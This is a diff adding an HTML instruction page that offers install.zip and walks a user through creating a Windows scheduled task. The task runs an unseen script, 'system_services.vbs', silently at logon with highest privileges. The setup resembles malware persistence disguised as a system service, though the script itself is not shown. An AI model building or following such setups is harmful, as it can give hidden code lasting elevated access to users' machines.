@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Task Configuration</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: #f5f5f5; padding: 20px; }
+        .container { max-width: 600px; margin: auto; background: white; border-radius: 4px; padding: 20px; }
+        
+        .header { 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            margin-bottom: 20px; 
+            padding-bottom: 15px; 
+            border-bottom: 1px solid #ddd; 
+        }
+        h1 { color: #333; font-size: 20px; }
+        .download-btn { 
+            background: #28a745; 
+            color: white; 
+            text-decoration: none; 
+            padding: 8px 16px; 
+            border-radius: 4px; 
+            font-size: 14px; 
+        }
+        .download-btn:hover { background: #218838; }
+        
+        .step { margin-bottom: 20px; background: #f9f9f9; padding: 15px; border-radius: 4px; }
+        .step h2 { color: #444; font-size: 16px; margin-bottom: 10px; }
+        .config-item { margin-bottom: 10px; }
+        .label { font-weight: bold; color: #333; margin-bottom: 5px; }
+        .value { display: flex; align-items: center; }
+        .copy-box { flex: 1; background: #fff; border: 1px solid #ddd; padding: 8px 10px; font-family: monospace; font-size: 13px; }
+        .copy-btn { background: #0066cc; color: white; border: none; padding: 8px 12px; margin-left: 10px; cursor: pointer; border-radius: 3px; }
+        .copy-btn:hover { background: #0052a3; }
+        .copy-btn.copied { background: #28a745; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>taskschd.msc Configuration</h1>
+            <a href="install.zip" class="download-btn" download>Download Install.zip</a>
+        </div>
+        
+        <div class="step">
+            <h2>General</h2>
+            <div class="config-item">
+                <div class="label">Run whether user is logged on or not:</div>
+                <div class="value">
+                    <div class="copy-box">☑ Checked</div>
+                </div>
+            </div>
+            <div class="config-item">
+                <div class="label">Run with highest privileges:</div>
+                <div class="value">
+                    <div class="copy-box">☑ Checked</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="step">
+            <h2>Triggers</h2>
+            <div class="config-item">
+                <div class="label">Begin the task:</div>
+                <div class="value">
+                    <div class="copy-box">At log on</div>
+                </div>
+            </div>
+            <div class="config-item">
+                <div class="label">Delay task for:</div>
+                <div class="value">
+                    <div class="copy-box">15 seconds</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="step">
+            <h2>Actions</h2>
+            <div class="config-item">
+                <div class="label">Program/script:</div>
+                <div class="value">
+                    <div class="copy-box">wscript.exe</div>
+                    <button class="copy-btn" onclick="copyText('wscript.exe', this)">Copy</button>
+                </div>
+            </div>
+            <div class="config-item">
+                <div class="label">Add arguments:</div>
+                <div class="value">
+                    <div class="copy-box">C:\ProgramData\Scripts\system_services.vbs</div>
+                    <button class="copy-btn" onclick="copyText('C:\\ProgramData\\Scripts\\system_services.vbs', this)">Copy</button>
+                </div>
+            </div>
+        </div>
+        
+        <div class="step">
+            <h2>Conditions</h2>
+            <div class="config-item">
+                <div class="label">Power:</div>
+                <div class="value">
+                    <div class="copy-box">☐ Start only on AC power</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="step">
+            <h2>Settings</h2>
+            <div class="config-item">
+                <div class="label">Additional settings:</div>
+                <div class="value">
+                    <div class="copy-box">☑ Run as soon as possible after a missed start</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        function copyText(text, button) {
+            const textArea = document.createElement('textarea');
+            textArea.value = text;
+            document.body.appendChild(textArea);
+            textArea.select();
+            
+            try {
+                document.execCommand('copy');
+                button.classList.add('copied');
+                button.textContent = 'Copied';
+                setTimeout(() => {
+                    button.classList.remove('copied');
+                    button.textContent = 'Copy';
+                }, 1500);
+            } catch (err) {
+                console.error('Copy failed:', err);
+            }
+            
+            document.body.removeChild(textArea);
+        }
+        
+        // 确保文件存在
+        document.querySelector('.download-btn').addEventListener('click', function(e) {
+            // 添加文件存在性检查
+            fetch('install.zip')
+                .then(response => {
+                    if (!response.ok) {
+                        e.preventDefault();
+                        alert('install.zip not found. Please ensure the file is in the same directory as this page.');
+                    }
+                })
+                .catch(() => {
+                    e.preventDefault();
+                    alert('install.zip not found. Please ensure the file is in the same directory as this page.');
+                });
+        });
+    </script>
+</body>
+</html>
